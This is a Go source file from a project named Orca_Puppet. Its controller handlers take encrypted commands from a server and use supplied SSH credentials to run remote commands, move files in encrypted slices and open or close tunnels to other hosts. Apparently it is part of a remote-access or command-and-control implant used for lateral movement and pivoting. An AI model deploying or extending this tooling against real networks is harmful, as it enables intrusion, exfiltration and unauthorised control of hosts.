package controller

import (
	"Orca_Puppet/cli/cmdopt/sshopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
	"time"
)

func sshConnTestCmd(sendUserId, decData string) {
	var sshStruct sshopt.SshStruct
	json.Unmarshal([]byte(decData), &sshStruct)
	username := sshStruct.SSHUser
	password := sshStruct.SSHPwd
	ip, port, _ := strings.Cut(sshStruct.SSHHost, ":")
	client := sshopt.NewSSHClient(username, password, ip, port)
	err := client.Connect()
	if err != nil {
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, err.Error())
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshTestConn_ret", retData)
	} else {
		output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "ssh connection is successful")
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "sshTestConn_ret", retData)
	}
}

func sshRunCmd(sendUserId, decData string) {
	var sshRun sshopt.SshRunStruct
	json.Unmarshal([]byte(decData), &sshRun)
	username := sshRun.SshStruct.SSHUser
	password := sshRun.SshStruct.SSHPwd
	ip, port, _ := strings.Cut(sshRun.SshStruct.SSHHost, ":")
	client := sshopt.NewSSHClient(username, password, ip, port)

	cmd := sshRun.Command
	backinfo, err := client.Run(cmd)
	if err != nil {
		message := fmt.Sprintf("failed to run shell: %v", err)
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		var retData, _ = crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
		return
	}
	message := fmt.Sprintf("'%v' back info: \n%v", cmd, backinfo)
	output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, message)
	retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "sshRun_ret", retData)
}

func sshUploadCmd(sendUserId, decData string) {
	m, exist := setchannel.GetFileSliceDataChan(sendUserId)
	if !exist {
		m = make(chan interface{})
		setchannel.AddFileSliceDataChan(sendUserId, m)
	}
	var sshUploadStruct sshopt.SshUploadStruct
	err := json.Unmarshal([]byte(decData), &sshUploadStruct)
	if err != nil {
		return
	}
	username := sshUploadStruct.SshStruct.SSHUser
	password := sshUploadStruct.SshStruct.SSHPwd
	ip, port, _ := strings.Cut(sshUploadStruct.SshStruct.SSHHost, ":")
	client := sshopt.NewSSHClient(username, password, ip, port)

	fileMetaInfo := sshUploadStruct.FileMetaInfo
	saveFile := fileMetaInfo.SaveFileName
	sliceNum := fileMetaInfo.SliceNum

	var fileByte []byte
	// 循环获取分片数据
	for i := 0; i < sliceNum+1; i++ {
		select {
		case metaData := <-m:
			fileByte = append(fileByte, metaData.([]byte)...)
		case <-time.After(5 * time.Second):
			setchannel.DeleteFileSliceDataChan(sendUserId)
			return
		}
	}
	_, err = client.UploadFile(fileByte, saveFile)
	if err != nil {
		message := fmt.Sprintf("upload failed: %v\n", err)
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshUpload_ret", retData)
		return
	} else {
		output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "file upload success")
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "sshUpload_ret", retData)
	}
}

func sshDownloadCmd(sendUserId, decData string) {
	var sshDownloadStruct sshopt.SshDownloadStruct
	json.Unmarshal([]byte(decData), &sshDownloadStruct)
	username := sshDownloadStruct.SshStruct.SSHUser
	password := sshDownloadStruct.SshStruct.SSHPwd
	ip, port, _ := strings.Cut(sshDownloadStruct.SshStruct.SSHHost, ":")
	client := sshopt.NewSSHClient(username, password, ip, port)
	requestFile := sshDownloadStruct.RequestFile
	remoteFile := requestFile.DestFileName
	saveFile := requestFile.SaveFileName
	fileInfo, err := client.LStateFile(remoteFile)
	if err != nil {
		message := fmt.Sprintf("download failed: %v", err)
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshDownload_ret", retData)
		return
	}
	if fileInfo.IsDir() {
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, "the requested file is a directory")
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "sshDownload_ret", retData)
		return
	}

	// 发送文件元信息
	fileMetaInfo := sshopt.GetFileMetaInfo(fileInfo, saveFile)
	sliceNum := fileMetaInfo.SliceNum
	sliceSize := fileMetaInfo.SliceSize
	remainSize := fileMetaInfo.RemainSize
	metaInfo, err := json.Marshal(fileMetaInfo)
	data, _ := crypto.Encrypt(metaInfo, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "fileMetaInfo", data)
	// 发送文件分片
	if client.SshClient == nil {
		if err = client.Connect(); err != nil {
			return
		}
	}
	pUploadFile, err := client.SftpClient.Open(remoteFile)
	defer client.SshClient.Close()
	defer client.SftpClient.Close()
	if err != nil {
		return
	}
	defer pUploadFile.Close()
	for i := 0; i < sliceNum; i++ {
		sliceData := make([]byte, sliceSize)
		_, err = pUploadFile.Read(sliceData)
		if err != nil && err != io.EOF {
			return
		}
		encData, _ := crypto.Encrypt(sliceData, []byte(config.AesKey))
		common.SendSuccessMsg(sendUserId, common.ClientId, "sliceData", encData)
	}
	// 处理最后一个分片
	sliceData := make([]byte, remainSize)
	_, err = pUploadFile.Read(sliceData)
	if err != nil && err != io.EOF {
		return
	}
	encData, _ := crypto.Encrypt(sliceData, []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "sliceData", encData)
}

func sshTunnelStartCmd(clientId, decData string) {
	var err error
	var sshTunnelStruct sshopt.SshTunnelStruct
	json.Unmarshal([]byte(decData), &sshTunnelStruct)
	username := sshTunnelStruct.SshStruct.SSHUser
	password := sshTunnelStruct.SshStruct.SSHPwd
	ip, port, _ := strings.Cut(sshTunnelStruct.SshStruct.SSHHost, ":")
	target := sshTunnelStruct.Target
	source := sshTunnelStruct.Source
	client := sshopt.NewSSHClient(username, password, ip, port)
	err = client.Connect()
	if err != nil {
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, err.Error())
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(clientId, common.ClientId, "sshTunnelStart_ret", retData)
		return
	}

	sshTunnel := client.Cli2Tunnel(target, source)
	if debug.IsDebug {
		sshTunnel.Log = log.New(os.Stdout, "", log.Ldate|log.Lmicroseconds)
	}
	go func() {
		err = sshTunnel.Start()
	}()
	if err != nil {
		output := colorcode.OutputMessage(colorcode.SIGN_FAIL, "tunnel open failed")
		retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
		common.SendFailMsg(clientId, common.ClientId, "sshTunnelStart_ret", retData)
		return
	}
	for _, recordList := range sshopt.SshTunnelRecordLists {
		if recordList.SshTunnelBaseRecord.Target == target && recordList.SshTunnelBaseRecord.Source == source {
			output := colorcode.OutputMessage(colorcode.SIGN_FAIL, "the tunnel is repeated")
			retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
			common.SendFailMsg(clientId, common.ClientId, "sshTunnelStart_ret", retData)
			return
		}
	}
	message := fmt.Sprintf("tunnel open successfully: %s --> %s", target, source)
	output := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, message)
	retData, _ := crypto.Encrypt([]byte(output), []byte(config.AesKey))
	common.SendSuccessMsg(clientId, common.ClientId, "sshTunnelStart_ret", retData)
	sshTunnelBaseRecord := sshopt.SshTunnelBaseRecord{
		Uid:      util.GenUUID(),
		ClientId: common.ClientId,
		Source:   source,
		Target:   target,
	}
	sshTunnelRecord := sshopt.SshTunnelRecord{
		SSHTunnel:           sshTunnel,
		SshTunnelBaseRecord: sshTunnelBaseRecord,
	}
	sshopt.SshTunnelRecordLists = append(sshopt.SshTunnelRecordLists, sshTunnelRecord)
	marshal, _ := json.Marshal(sshTunnelBaseRecord)
	data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
	common.SendSuccessMsg("Server", common.ClientId, "sshTunnelAdd", data)
}

func sshTunnelCloseCmd(decData string) {
	index := -1
	closeFlag := false
	for i, record := range sshopt.SshTunnelRecordLists {
		if decData == record.SshTunnelBaseRecord.Uid {
			record.SSHTunnel.Close()
			index = i
			closeFlag = true
		}
	}
	if closeFlag {
		sshopt.SshTunnelRecordLists = append(sshopt.SshTunnelRecordLists[:index], sshopt.SshTunnelRecordLists[index+1:]...)
	}
	data, _ := crypto.Encrypt([]byte(decData), []byte(config.AesKey))
	common.SendSuccessMsg("Server", common.ClientId, "sshTunnelDel", data)
}
